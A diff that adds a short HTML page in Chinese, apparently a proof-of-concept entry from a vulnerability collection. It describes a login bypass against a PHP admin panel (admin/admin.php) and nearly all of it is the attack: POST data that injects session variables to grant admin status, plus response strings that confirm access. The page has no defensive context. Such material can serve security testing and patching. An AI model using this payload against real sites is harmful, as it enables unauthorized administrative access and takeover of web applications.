@@ -1,0 +1,9 @@
+<meta charset="UTF-8">
+<div>
+    <h3>登录绕过URL: </h3>
+    <code>http://example.com/admin/admin.php</code>
+    <h3>POST-DATA: </h3>
+    <code>_SESSION[login_in]=1&_SESSION[admin]=1&_SESSION[login_time]=300000000000000000000000\r\n</code>
+    <h3>返回结果</h3>
+    <p>查看返回页面源码中是否有字符：admin_form.php?action=form_list&nav=list_order 和字符：admin_main.php?nav=main</p>
+</div>
